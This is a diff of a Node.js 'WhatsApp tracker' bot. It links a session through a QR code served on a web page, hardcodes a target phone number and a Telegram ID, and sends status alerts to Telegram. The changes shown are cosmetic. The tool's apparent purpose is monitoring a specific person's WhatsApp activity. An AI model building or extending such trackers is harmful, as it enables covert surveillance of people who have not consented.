@@ -13,7 +13,7 @@ const TELEGRAM_ID = "7410396096";
 const NUMERO_OBJETIVO = "593996752239@s.whatsapp.net";
 
 let qrCodeUltimo = "";
-let estadoConexion = "Iniciando conexión...";
+let estadoConexion = "Iniciando...";
 
 async function enviarTelegram(mensaje) {
     try {
@@ -33,7 +33,7 @@ async function iniciarBot() {
     const sock = makeWASocket({
         auth: state,
         logger: pino({ level: 'silent' }),
-        printQRInTerminal: true
+        browser: ["RastreadorBot", "Chrome", "120.0.0.0"]
     });
 
     sock.ev.on('creds.update', saveCreds);
@@ -42,9 +42,9 @@ async function iniciarBot() {
         const { connection, lastDisconnect, qr } = update;
         
         if (qr) {
-            console.log('¡Nuevo código QR generado!');
             qrCodeUltimo = qr;
             estadoConexion = "Esperando escaneo de QR";
+            console.log('¡Nuevo código QR listo para la web!');
         }
 
         if (connection === 'open') {
@@ -54,11 +54,15 @@ async function iniciarBot() {
             enviarTelegram("🟢 *Rastreador Node.js Iniciado*\nSesión vinculada correctamente.");
         } else if (connection === 'close') {
             estadoConexion = "Desconectado";
-            qrCodeUltimo = "";
-            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
-            console.log('Conexión cerrada. Reconectando:', shouldReconnect);
+            const statusCode = (lastDisconnect?.error instanceof Boom)?.output?.statusCode;
+            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+            
+            console.log(`Conexión cerrada (Código: ${statusCode}). Reconectando: ${shouldReconnect}`);
+            
             if (shouldReconnect) {
-                setTimeout(iniciarBot, 5000);
+                setTimeout(iniciarBot, 3000);
+            } else {
+                console.log('Sesión cerrada por completo. Borra la carpeta de credenciales si necesitas un nuevo QR.');
             }
         }
     });
@@ -80,24 +84,24 @@ app.get('/', async (req, res) => {
         try {
             const urlImagenQR = await qrcode.toDataURL(qrCodeUltimo);
             res.send(`
-                <div style="text-align:center; font-family:sans-serif; margin-top:50px;">
+                <div style="text-align:center; font-family:sans-serif; margin-top:40px;">
                     <h2>Vinculación de WhatsApp</h2>
-                    <p>Escanea este código QR con la aplicación de WhatsApp:</p>
-                    <img src="${urlImagenQR}" alt="Código QR WhatsApp" style="width:300px; height:300px;"/>
-                    <p><b>Estado:</b> ${estadoConexion}</p>
-                    <br><button onclick="window.location.reload();" style="padding:10px 20px;">Actualizar Estado</button>
+                    <p>Escanea este código QR con la app de WhatsApp:</p>
+                    <img src="${urlImagenQR}" alt="QR WhatsApp" style="width:300px; height:300px; border: 2px solid #ccc; border-radius: 10px;"/>
+                    <p><b>Estado:</b> <span style="color:orange;">${estadoConexion}</span></p>
+                    <br><button onclick="window.location.reload();" style="padding:10px 20px; font-size:16px; cursor:pointer;">Actualizar Página</button>
                 </div>
             `);
         } catch (err) {
-            res.send("Generando código QR, por favor recarga la página en unos segundos...");
+            res.send("Generando imagen QR, por favor recarga en unos segundos...");
         }
     } else {
         res.send(`
-            <div style="text-align:center; font-family:sans-serif; margin-top:50px;">
+            <div style="text-align:center; font-family:sans-serif; margin-top:40px;">
                 <h2>Rastreador de WhatsApp Activo</h2>
-                <p><b>Estado:</b> ${estadoConexion}</p>
-                <p>Si el QR no aparece, espera 10 segundos y recarga la página.</p>
-                <br><button onclick="window.location.reload();" style="padding:10px 20px;">Recargar Página</button>
+                <p><b>Estado:</b> <span style="color:${estadoConexion === 'Conectado' ? 'green' : 'red'};">${estadoConexion}</span></p>
+                <p>Si está desconectado, espera unos segundos a que se genere el QR y presiona el botón.</p>
+                <br><button onclick="window.location.reload();" style="padding:10px 20px; font-size:16px; cursor:pointer;">Recargar Página</button>
             </div>
         `);
     }
